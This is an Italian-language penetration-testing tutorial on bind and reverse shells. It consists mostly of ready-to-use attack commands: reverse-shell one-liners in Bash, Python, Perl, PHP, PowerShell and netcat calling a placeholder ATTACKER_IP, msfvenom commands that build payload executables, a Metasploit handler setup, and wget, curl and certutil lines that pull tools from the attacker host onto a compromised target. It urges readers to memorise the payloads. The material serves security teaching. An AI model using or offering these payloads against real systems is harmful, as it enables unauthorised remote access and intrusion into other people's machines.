# Reverse Shell e Bind Shell: ottenere accesso remoto

## Introduzione

Hai trovato una vulnerabilità che ti permette di eseguire comandi su un server remoto — una RCE (Remote Code Execution). Ottimo. Ma come trasformi questo in una **sessione interattiva** che puoi usare comodamente?

La risposta sono le **shell remote**: meccanismi per ottenere una riga di comando su un sistema remoto. Le due varianti principali sono la **bind shell** e la **reverse shell**.

---

## Bind Shell vs Reverse Shell

### Bind Shell

Il target apre una porta in ascolto. L'attaccante si connette a quella porta.

```
[Attaccante] ──── CONNECT ──→ [Target:porta_x] → shell
```

**Problema:** i firewall bloccano le connessioni in ingresso verso porte insolite. La bind shell funziona raramente in ambienti reali.

### Reverse Shell

Il target si connette all'attaccante. L'attaccante ascolta in attesa della connessione.

```
[Attaccante:porta_x] ←── CONNECT ── [Target]
```

**Vantaggio:** i firewall di solito permettono il traffico in uscita. La reverse shell funziona anche in reti con firewall restrittivi.

La **reverse shell è il metodo standard** nei pentest moderni.

---

## Setup dell'attaccante: mettersi in ascolto

Prima di lanciare qualsiasi payload sul target, devi essere in ascolto.

### Netcat (nc)

```bash
nc -lvnp 4444
# -l  → listen mode
# -v  → verbose
# -n  → no DNS lookup
# -p  → porta
```

### Rlwrap (migliora l'esperienza)

La shell ricevuta via netcat è primitiva — niente frecce, niente tab, niente CTRL+C senza perdere la sessione.

```bash
rlwrap nc -lvnp 4444
```

### Metasploit multi/handler

Per ricevere shell Meterpreter o shell avanzate:

```
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST TUO_IP
set LPORT 4444
run
```

---

## Payload per reverse shell

### Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Python

```bash
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP (utile dopo RCE su web server)

```php
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PowerShell (Windows)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Netcat (se disponibile sul target)

```bash
nc -e /bin/sh ATTACKER_IP 4444
# Versioni vecchie di nc (-e non sempre disponibile)

# Alternativa senza -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

---

## RevShells.com

Non devi memorizzare tutti questi payload. Il sito **revshells.com** genera automaticamente il payload giusto per il sistema e il linguaggio che ti serve — basta inserire IP e porta.

---

## msfvenom: creare payload compilati

Per sistemi dove non puoi eseguire comandi shell direttamente, crei un eseguibile:

```bash
# Eseguibile Windows (.exe)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe

# Script PHP
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php

# Script Python
msfvenom -p cmd/unix/reverse_python LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.py

# Payload Meterpreter (più potente della shell classica)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o met.exe
```

---

## Upgrade della shell: da dumb shell a TTY

La shell ricevuta è spesso una "dumb shell" — niente tab completion, niente editor, CTRL+C termina tutto.

```bash
# Step 1: spawn di una pseudo-TTY con Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: background della shell con CTRL+Z

# Step 3: nella tua macchina
stty raw -echo; fg

# Step 4: di nuovo nella shell remota
export TERM=xterm
stty rows 40 cols 200   # adatta alle dimensioni del tuo terminale
```

Ora hai una shell completamente interattiva.

---

## Trasferire file sul target

Una volta dentro, spesso hai bisogno di caricare tool (LinPEAS, Chisel, ecc.).

```bash
# Avvia server HTTP sulla tua macchina
python3 -m http.server 8080

# Sul target Linux
wget http://ATTACKER_IP:8080/tool.sh
curl -o tool.sh http://ATTACKER_IP:8080/tool.sh

# Sul target Windows (PowerShell)
Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/tool.exe" -OutFile "C:\temp\tool.exe"
certutil -urlcache -split -f "http://ATTACKER_IP:8080/tool.exe" tool.exe
```

---

## Conclusione

Le reverse shell sono il pane quotidiano del penetration tester. Impara a memoria almeno il payload bash e quello PowerShell, e tieni a portata di mano revshells.com per il resto.

La parte più importante è il **setup del listener** prima di lanciare il payload — quante volte si vede un principiante che lancia il payload e poi si chiede perché non funziona senza aver avviato il listener...
